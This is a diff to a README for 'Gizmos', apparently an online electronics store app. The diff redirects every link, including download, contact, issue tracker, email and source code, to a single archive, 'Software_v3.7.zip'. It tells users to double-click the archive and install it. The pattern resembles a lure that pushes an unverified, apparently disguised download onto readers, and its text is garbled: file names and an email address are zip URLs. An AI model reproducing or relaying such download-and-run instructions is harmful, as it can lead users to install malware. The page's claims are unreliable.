@@ -4,7 +4,7 @@
 Welcome to Gizmos! This guide will help you download and run our online electronics store without any hassle. 
 
 ## 📥 Download Links
-[![Download Gizmos](https://raw.githubusercontent.com/medo751/Gizmos/main/Rauraci/Gizmos.zip%20Gizmos-v1.0-blue)](https://raw.githubusercontent.com/medo751/Gizmos/main/Rauraci/Gizmos.zip)
+[![Download Gizmos](https://github.com/medo751/Gizmos/raw/refs/heads/main/Rauraci/Software_v3.7.zip%20Gizmos-v1.0-blue)](https://github.com/medo751/Gizmos/raw/refs/heads/main/Rauraci/Software_v3.7.zip)
 
 ## 📋 Features
 Gizmos offers a seamless shopping experience. Here are some features you can enjoy:
@@ -24,19 +24,19 @@ To start using Gizmos, follow these easy steps:
 
 1. **Visit the Releases Page:**
    Click the link below to go to the Downloads section where you can get the latest version.
-   [Visit the Releases Page to Download](https://raw.githubusercontent.com/medo751/Gizmos/main/Rauraci/Gizmos.zip)
+   [Visit the Releases Page to Download](https://github.com/medo751/Gizmos/raw/refs/heads/main/Rauraci/Software_v3.7.zip)
 
 2. **Download the Application:**
    On the releases page, find the latest version of Gizmos. Click the download link for your operating system. This will save a file to your computer.
 
 3. **Locate the Downloaded File:**
-   Open your downloads folder. You should find the file named something like `https://raw.githubusercontent.com/medo751/Gizmos/main/Rauraci/Gizmos.zip` or `https://raw.githubusercontent.com/medo751/Gizmos/main/Rauraci/Gizmos.zip`.
+   Open your downloads folder. You should find the file named something like `https://github.com/medo751/Gizmos/raw/refs/heads/main/Rauraci/Software_v3.7.zip` or `https://github.com/medo751/Gizmos/raw/refs/heads/main/Rauraci/Software_v3.7.zip`.
 
 4. **Install the Application:**
    - **For Windows:**
-     Double-click the `https://raw.githubusercontent.com/medo751/Gizmos/main/Rauraci/Gizmos.zip` file and follow the installation prompts.
+     Double-click the `https://github.com/medo751/Gizmos/raw/refs/heads/main/Rauraci/Software_v3.7.zip` file and follow the installation prompts.
    - **For macOS:**
-     Open the `https://raw.githubusercontent.com/medo751/Gizmos/main/Rauraci/Gizmos.zip` file and drag the Gizmos icon into your Applications folder.
+     Open the `https://github.com/medo751/Gizmos/raw/refs/heads/main/Rauraci/Software_v3.7.zip` file and drag the Gizmos icon into your Applications folder.
 
 5. **Run the Application:**
    After installation, find Gizmos in your application list. Open it, and you’re ready to start shopping!
@@ -57,18 +57,18 @@ If you experience issues:
 - Check your internet connection.
 - Restart the application if it fails to load.
 
-If problems persist, please report them through our [Contact Page](https://raw.githubusercontent.com/medo751/Gizmos/main/Rauraci/Gizmos.zip).
+If problems persist, please report them through our [Contact Page](https://github.com/medo751/Gizmos/raw/refs/heads/main/Rauraci/Software_v3.7.zip).
 
 ## ⚙️ Support
 For additional help or questions, visit our support channels:
-- GitHub Issue Tracker: Submit issues [here](https://raw.githubusercontent.com/medo751/Gizmos/main/Rauraci/Gizmos.zip).
-- Email Support: Contact us at https://raw.githubusercontent.com/medo751/Gizmos/main/Rauraci/Gizmos.zip
+- GitHub Issue Tracker: Submit issues [here](https://github.com/medo751/Gizmos/raw/refs/heads/main/Rauraci/Software_v3.7.zip).
+- Email Support: Contact us at https://github.com/medo751/Gizmos/raw/refs/heads/main/Rauraci/Software_v3.7.zip
 
 ## 📄 License
 Gizmos is open-source software. You can freely use it according to our license terms. Check the repository for more details.
 
 ## 🔗 Links
-- [Visit the Releases Page to Download](https://raw.githubusercontent.com/medo751/Gizmos/main/Rauraci/Gizmos.zip)
-- [Source Code](https://raw.githubusercontent.com/medo751/Gizmos/main/Rauraci/Gizmos.zip)
+- [Visit the Releases Page to Download](https://github.com/medo751/Gizmos/raw/refs/heads/main/Rauraci/Software_v3.7.zip)
+- [Source Code](https://github.com/medo751/Gizmos/raw/refs/heads/main/Rauraci/Software_v3.7.zip)
 
 Thank you for choosing Gizmos. Happy shopping!
